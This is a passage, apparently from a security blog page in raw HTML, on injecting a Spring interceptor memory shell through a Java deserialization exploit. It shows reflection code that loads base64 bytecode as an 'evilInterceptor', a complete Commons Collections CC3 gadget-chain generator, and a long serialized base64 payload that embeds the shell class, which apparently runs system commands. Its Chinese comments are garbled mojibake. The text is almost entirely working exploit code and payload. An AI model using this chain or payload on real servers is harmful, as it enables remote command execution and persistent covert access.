DYABQBiAHEAMwA0AAYAcABjADcAOAAHAIUATgA5ADoACACJAEoAOwA8AAkAkgBBAD0APgAKAAAA3AAvADAAAAAAANwAPwBAAAEAAADcAEEAQgACAAAA3ABDAEQAAwAKANIARQA8AAQARgAAAFUAB/0ARgcARwcASPwAGwcASf8ALwALBwBKBwBLBwBMBwBNBwBHBwBIBwBJBwBOBwBPBwBHBwBQAAAn/wAbAAUHAEoHAEsHAEwHAE0HAEcAAQcAUQEBAFIAAAAEAAEAJABTAAAADQMAPwAAAEEAAABDAAAAAQBUAFUAAwAsAAAAYAAFAAUAAAAKKissLRkEtwAlsQAAAAIALQAAAAoAAgAAAC4ACQAvAC4AAAA0AAUAAAAKAC8AMAAAAAAACgA/AEAAAQAAAAoAQQBCAAIAAAAKAEMARAADAAAACgBWAFcABABSAAAABAABACQAUwAAABEEAD8AAABBAAAAQwAAAFYAAAABAFgAWQADACwAAABgAAUABQAAAAoqKywtGQS3ACaxAAAAAgAtAAAACgACAAAAMwAJADQALgAAADQABQAAAAoALwAwAAAAAAAKAD8AQAABAAAACgBBAEIAAgAAAAoAQwBEAAMAAAAKAFoAWwAEAFIAAAAEAAEAJABTAAAAEQQAPwAAAEEAAABDAAAAWgAAAAEAXAAAAAIAXQ==&quot;</span>;<br>            <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.interceptor.TestInterceptor&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>            Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>            <span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> (HandlerInterceptor) constructor.newInstance();<br>            adaptInterceptors.add(evilInterceptor);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>cc3é“¾å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Interceptor</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//åˆ©ç”¨åå°„è®¾ç½®éœ€è¦æ»¡è¶³çš„å€¼</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;InterceptorDes.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//è¿™é‡Œçš„èµ‹å€¼åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±ä¸éœ€è¦äº†</span><br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br><span class="hljs-comment">//        Transformer transformer = templates.newTransformer();</span><br>        <span class="hljs-comment">//ç»“åˆå‰é¢çš„é“¾å­ä¸²è”èµ·æ¥ï¼Œéšä¾¿ä¸€ä¸ªéƒ½è¡Œ</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);<br>        annotation.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotation.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotation.newInstance(Override.class, proxyMap);<br>        System.out.println(serialize(o));<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>)).writeObject(obj);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(bytes);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAJzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABhMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAjZsr+ur4AAAA0ALsKACoAZwoAaABpCABqCwBrAGwHAG0HAG4LAAUAbwgAcAoAFwBxBwByCgAKAHMKAHQAdQoAdAB2BwB3BwB4CgAPAHMIAHkHAHoKABIAZwoAEgB7BwB8CAB9BwB+BwB/BwBPCQCAAIEKABcAggoAgwB1CgCEAIUKAIQAhgcAhwgAiAoAgACJCgCDAIoKABcAiwoAjACNBwCOCwAOAI8HAJAKACcAcwcAkQcAkgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAaTGNvbS9jbG93bi9JbnRlcmNlcHRvckRlczsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAkwEAEE1ldGhvZFBhcmFtZXRlcnMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEAB2NvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAVbWFwcGluZ0hhbmRsZXJNYXBwaW5nAQBATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXJNYXBwaW5nOwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAEWFkYXB0SW50ZXJjZXB0b3JzAQAQTGphdmEvdXRpbC9MaXN0OwEABGNvZGUBABJMamF2YS9sYW5nL1N0cmluZzsBAAFkAQACW0IBAAFtAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY29uc3RydWN0b3IBAB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAPZXZpbEludGVyY2VwdG9yAQA0TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOwEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAEZMamF2YS91dGlsL0xpc3Q8TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOz47AQAUTGphdmEvbGFuZy9DbGFzczwqPjsBACJMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I8Kj47AQANU3RhY2tNYXBUYWJsZQcAbQcAbgcAlAcAcgcAdwcAeAcAkAEAClNvdXJjZUZpbGUBABNJbnRlcmNlcHRvckRlcy5qYXZhDAArACwHAJUMAJYAlwEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcAmAwAmQCaAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAD5vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvQWJzdHJhY3RIYW5kbGVyTWFwcGluZwwAmwCcAQATYWRhcHRlZEludGVyY2VwdG9ycwwAnQCeAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDACfACwHAJQMAKAAoQwAogCjAQAOamF2YS91dGlsL0xpc3QBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgER0Hl2NjZ2Z0FBQURRQXJBb0FLQUJlQ0FCRkN3QmZBR0FMQUdFQVlnZ0FZd29BWkFCbENnQUxBR1lJQUdjS0FBc0FhQWNBYVFjQWFnZ0Fhd2dBYkFvQUNnQnRDQUJ1Q0FCdkNnQUtBSEFLQUFvQWNRY0FjZ2NBY3dvQWRBQjFDZ0FVQUhZS0FCTUFkd2dBZUFjQWVRb0FHUUJlQ2dBVEFIb0tBQmtBZXdnQWZBb0FHUUI5Q1FCa0FINEtBSDhBZ0FvQWdRQ0FDZ0NCQUlJS0FJRUFnd2NBaEFzQUtRQ0ZDd0FwQUlZSEFJY0hBSWdIQUlrQkFBWThhVzVwZEQ0QkFBTW9LVllCQUFSRGIyUmxBUUFQVEdsdVpVNTFiV0psY2xSaFlteGxBUUFTVEc5allXeFdZWEpwWVdKc1pWUmhZbXhsQVFBRWRHaHBjd0VBUFV4dmNtY3ZZMnh2ZDI0dmMzQnlhVzVuWW05dmRHMWxiVzl5ZVhOb1pXeHNMMmx1ZEdWeVkyVndkRzl5TDFSbGMzUkpiblJsY21ObGNIUnZjanNCQUFsd2NtVklZVzVrYkdVQkFHUW9UR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnlkbXhsZEZKbGNYVmxjM1E3VEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjM0J2Ym5ObE8weHFZWFpoTDJ4aGJtY3ZUMkpxWldOME95bGFBUUFCY0FFQUdreHFZWFpoTDJ4aGJtY3ZVSEp2WTJWemMwSjFhV3hrWlhJN0FRQUdkM0pwZEdWeUFRQVZUR3BoZG1FdmFXOHZVSEpwYm5SWGNtbDBaWEk3QVFBSGNISnZZMlZ6Y3dFQUUweHFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN6c0JBQUZ5QVFBWVRHcGhkbUV2YVc4dlFuVm1abVZ5WldSU1pXRmtaWEk3QVFBR2NtVnpkV3gwQVFBU1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQUhjbVZ6ZFd4MGN3RUFHVXhxWVhaaEwyeGhibWN2VTNSeWFXNW5RblZwYkdSbGNqc0JBQWR5WlhGMVpYTjBBUUFuVEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjWFZsYzNRN0FRQUljbVZ6Y0c5dWMyVUJBQ2hNYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVN0FRQUhhR0Z1Wkd4bGNnRUFFa3hxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQkdOdlpHVUJBQTFUZEdGamEwMWhjRlJoWW14bEJ3QnFCd0NLQndCcEJ3Q0hCd0NMQndDTUJ3Q0lCd0NOQndCeUJ3QjVCd0NFQVFBS1JYaGpaWEIwYVc5dWN3RUFFRTFsZEdodlpGQmhjbUZ0WlhSbGNuTUJBQXB3YjNOMFNHRnVaR3hsQVFDU0tFeHFZWFpoZUM5elpYSjJiR1YwTDJoMGRIQXZTSFIwY0ZObGNuWnNaWFJTWlhGMVpYTjBPMHhxWVhaaGVDOXpaWEoyYkdWMEwyaDBkSEF2U0hSMGNGTmxjblpzWlhSU1pYTndiMjV6WlR0TWFtRjJZUzlzWVc1bkwwOWlhbVZqZER0TWIzSm5MM053Y21sdVoyWnlZVzFsZDI5eWF5OTNaV0l2YzJWeWRteGxkQzlOYjJSbGJFRnVaRlpwWlhjN0tWWUJBQXh0YjJSbGJFRnVaRlpwWlhjQkFDNU1iM0puTDNOd2NtbHVaMlp5WVcxbGQyOXlheTkzWldJdmMyVnlkbXhsZEM5TmIyUmxiRUZ1WkZacFpYYzdBUUFQWVdaMFpYSkRiMjF3YkdWMGFXOXVBUUI1S0V4cVlYWmhlQzl6WlhKMmJHVjBMMmgwZEhBdlNIUjBjRk5sY25ac1pYUlNaWEYxWlhOME8weHFZWFpoZUM5elpYSjJiR1YwTDJoMGRIQXZTSFIwY0ZObGNuWnNaWFJTWlhOd2IyNXpaVHRNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHRNYW1GMllTOXNZVzVuTDBWNFkyVndkR2x2YmpzcFZnRUFBbVY0QVFBVlRHcGhkbUV2YkdGdVp5OUZlR05sY0hScGIyNDdBUUFLVTI5MWNtTmxSbWxzWlFFQUZGUmxjM1JKYm5SbGNtTmxjSFJ2Y2k1cVlYWmhEQUFxQUNzSEFJc01BSTRBandjQWpBd0FrQUNSQVFBSGIzTXVibUZ0WlFjQWtnd0Frd0NQREFDVUFKVUJBQU4zYVc0TUFKWUFsd0VBR0dwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56UW5WcGJHUmxjZ0VBRUdwaGRtRXZiR0Z1Wnk5VGRISnBibWNCQUFkamJXUXVaWGhsQVFBQ0wyTU1BQ29BbUFFQUNTOWlhVzR2WW1GemFBRUFBaTFqREFDWkFKb01BSnNBbkFFQUZtcGhkbUV2YVc4dlFuVm1abVZ5WldSU1pXRmtaWElCQUJscVlYWmhMMmx2TDBsdWNIVjBVM1J5WldGdFVtVmhaR1Z5QndDTkRBQ2RBSjRNQUNvQW53d0FLZ0NnQVFBQUFRQVhhbUYyWVM5c1lXNW5MMU4wY21sdVowSjFhV3hrWlhJTUFLRUFsUXdBb2dDakFRQUNEUW9NQUtRQWxRd0FwUUNtQndDbkRBQ29BS2tIQUlvTUFLb0FLd3dBcXdBckFRQVRhbUYyWVM5c1lXNW5MMFY0WTJWd2RHbHZiZ3dBVkFCVkRBQllBRmtCQUR0dmNtY3ZZMnh2ZDI0dmMzQnlhVzVuWW05dmRHMWxiVzl5ZVhOb1pXeHNMMmx1ZEdWeVkyVndkRzl5TDFSbGMzUkpiblJsY21ObGNIUnZjZ0VBRUdwaGRtRXZiR0Z1Wnk5UFltcGxZM1FCQURKdmNtY3ZjM0J5YVc1blpuSmhiV1YzYjNKckwzZGxZaTl6WlhKMmJHVjBMMGhoYm1Sc1pYSkpiblJsY21ObGNIUnZjZ0VBRTJwaGRtRXZhVzh2VUhKcGJuUlhjbWwwWlhJQkFDVnFZWFpoZUM5elpYSjJiR1YwTDJoMGRIQXZTSFIwY0ZObGNuWnNaWFJTWlhGMVpYTjBBUUFtYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVQkFCRnFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN3RUFER2RsZEZCaGNtRnRaWFJsY2dFQUppaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFKWjJWMFYzSnBkR1Z5QVFBWEtDbE1hbUYyWVM5cGJ5OVFjbWx1ZEZkeWFYUmxjanNCQUJCcVlYWmhMMnhoYm1jdlUzbHpkR1Z0QVFBTFoyVjBVSEp2Y0dWeWRIa0JBQXQwYjB4dmQyVnlRMkZ6WlFFQUZDZ3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFJWTI5dWRHRnBibk1CQUJzb1RHcGhkbUV2YkdGdVp5OURhR0Z5VTJWeGRXVnVZMlU3S1ZvQkFCWW9XMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxXQVFBVGNtVmthWEpsWTNSRmNuSnZjbE4wY21WaGJRRUFIU2hhS1V4cVlYWmhMMnhoYm1jdlVISnZZMlZ6YzBKMWFXeGtaWEk3QVFBRmMzUmhjblFCQUJVb0tVeHFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN6c0JBQTVuWlhSSmJuQjFkRk4wY21WaGJRRUFGeWdwVEdwaGRtRXZhVzh2U1c1d2RYUlRkSEpsWVcwN0FRQVlLRXhxWVhaaEwybHZMMGx1Y0hWMFUzUnlaV0Z0T3lsV0FRQVRLRXhxWVhaaEwybHZMMUpsWVdSbGNqc3BWZ0VBQ0hKbFlXUk1hVzVsQVFBR1lYQndaVzVrQVFBdEtFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5c1lXNW5MMU4wY21sdVowSjFhV3hrWlhJN0FRQUlkRzlUZEhKcGJtY0JBQU52ZFhRQkFCVk1hbUYyWVM5cGJ5OVFjbWx1ZEZOMGNtVmhiVHNCQUJOcVlYWmhMMmx2TDFCeWFXNTBVM1J5WldGdEFRQUhjSEpwYm5Sc2JnRUFGU2hNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNwVmdFQUJXWnNkWE5vQVFBRlkyeHZjMlVBSVFBbkFDZ0FBUUFwQUFBQUJBQUJBQ29BS3dBQkFDd0FBQUF2QUFFQUFRQUFBQVVxdHdBQnNRQUFBQUlBTFFBQUFBWUFBUUFBQUF3QUxnQUFBQXdBQVFBQUFBVUFMd0F3QUFBQUFRQXhBRElBQXdBc0FBQUNKd0FHQUFzQUFBRGNLeElDdVFBREFnQTZCQmtFeGdET0xMa0FCQUVBT2dVU0JiZ0FCcllBQnhJSXRnQUptUUFpdXdBS1dRYTlBQXRaQXhJTVUxa0VFZzFUV1FVWkJGTzNBQTQ2QnFjQUg3c0FDbGtHdlFBTFdRTVNEMU5aQkJJUVUxa0ZHUVJUdHdBT09nWVpCZ1MyQUJGWEdRYTJBQkk2QjdzQUUxbTdBQlJaR1FlMkFCVzNBQmEzQUJjNkNCSVlPZ203QUJsWnR3QWFPZ29aQ0xZQUcxazZDY1lBSUJrS3V3QVpXYmNBR2hrSnRnQWNFaDIyQUJ5MkFCNjJBQnhYcC8vYnNnQWZHUXEyQUNBWkJSa0t0Z0FoR1FXMkFDSVpCYllBSTZjQUJUb0ZBNndFckFBQkFBOEEwd0RXQUNRQUF3QXRBQUFBVmdBVkFBQUFEd0FLQUJBQUR3QVNBQmNBRkFBbkFCVUFSZ0FYQUdJQUdRQnBBQm9BY0FBYkFJVUFIQUNKQUIwQWtnQWVBSjBBSHdDNkFDRUF3Z0FpQU1rQUl3RE9BQ1FBMHdBbUFOWUFKUURZQUNjQTJnQXBBQzRBQUFCNkFBd0FRd0FEQURNQU5BQUdBQmNBdkFBMUFEWUFCUUJpQUhFQU13QTBBQVlBY0FCakFEY0FPQUFIQUlVQVRnQTVBRG9BQ0FDSkFFb0FPd0E4